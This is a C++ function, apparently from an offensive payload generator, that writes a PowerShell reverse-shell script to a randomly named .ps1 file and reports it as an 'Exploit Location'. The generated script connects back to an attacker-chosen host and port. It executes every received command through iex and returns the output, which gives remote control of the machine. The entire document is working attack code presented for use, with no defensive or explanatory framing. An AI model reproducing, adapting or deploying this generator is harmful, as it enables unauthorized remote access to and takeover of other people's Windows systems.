void windows_ps_reverse_tcp(string lhost, string lport){

    char rn[100], xx[5] = ".ps1";
    srand ( time(NULL) );
    int x = rand() % 99999 + 11111;
    itoa (x,rn,10);
    strcat(rn,xx);

    string output;
    output+="$client = New-Object System.Net.Sockets.TCPClient(\"";
    output+=lhost;
    output+="\",";
    output+=lport;
    output+=");$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";


    string filename( rn );
    std::ofstream outfile (filename.c_str());
    outfile << output;
    outfile.close();

    char *path = NULL;
    path = getcwd(NULL, 0); // or _getcwd
    if ( path != NULL)

        rlutil::setColor(10);
        cout << "\n\tExploit Location : " << path << "\\" << filename << "\n\n";

}
